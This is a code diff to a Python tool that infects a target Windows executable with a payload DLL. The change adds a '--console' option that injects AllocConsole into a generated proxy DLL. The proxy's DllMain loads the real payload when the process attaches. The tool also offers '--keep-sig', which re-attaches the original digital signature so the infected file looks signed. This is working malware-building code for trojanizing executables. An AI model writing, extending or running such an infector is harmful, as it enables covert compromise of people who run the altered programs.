@@ -69,15 +69,31 @@ def target_cc(target_path):
     return cc
 
 
-def build_proxy(real_payload_path, build_dir, cc, export_name="Trigger"):
+def build_proxy(real_payload_path, build_dir, cc, export_name="Trigger", console=False):
     real_name = os.path.basename(real_payload_path)
     src = os.path.join(build_dir, "proxy.c")
     dll = os.path.join(build_dir, "proxy.dll")
 
+    if console:
+        console_init = '''#include <stdio.h>
+static void init_console(void) {
+    AllocConsole();
+    freopen("CONOUT$", "w", stdout);
+    freopen("CONOUT$", "w", stderr);
+    freopen("CONIN$", "r", stdin);
+}
+'''
+        call_init = "        init_console();\n"
+    else:
+        console_init = ""
+        call_init = ""
+
     code = f'''#include <windows.h>
 __declspec(dllexport) void __cdecl {export_name}(void) {{}}
-BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {{
-    if (r == DLL_PROCESS_ATTACH) LoadLibraryA("{real_name}");
+{console_init}BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {{
+    if (r == DLL_PROCESS_ATTACH) {{
+{call_init}        LoadLibraryA("{real_name}");
+    }}
     return TRUE;
 }}
 '''
@@ -418,6 +434,8 @@ def main():
     parser.add_argument("--dll", help="Path to a pre-built payload DLL (alternative to --payload)")
     parser.add_argument("--soft-link", action="store_true",
         help="Generate a proxy DLL that LoadLibrary's the real payload; avoids needing a specific export")
+    parser.add_argument("--console", action="store_true",
+        help="Force a visible console window on load (inject AllocConsole into the proxy)")
     parser.add_argument("--target", required=True, help="Target .exe to infect")
     parser.add_argument("--output", help="Output path (default: <target>-embedded.exe)")
     parser.add_argument("--keep-sig", action="store_true", help="Re-attach original digital signature (invalid but present)")
@@ -441,6 +459,9 @@ def main():
         sys.exit(1)
     if args.soft_link and not args.dll:
         print("[-] --soft-link requires --dll (the real payload DLL)")
+        sys.exit(1)
+    if args.console and not args.soft_link:
+        print("[-] --console requires --soft-link (it is injected into the proxy DLL)")
         sys.exit(1)
 
     extra_files = []
@@ -490,7 +511,7 @@ def main():
             shutil.copy2(payload_dll, renamed)
             payload_dll = renamed
 
-            proxy_dll = build_proxy(payload_dll, build_dir, cc)
+            proxy_dll = build_proxy(payload_dll, build_dir, cc, console=args.console)
             if not proxy_dll:
                 sys.exit(1)
             check_machine_match(args.target, proxy_dll, "proxy DLL")
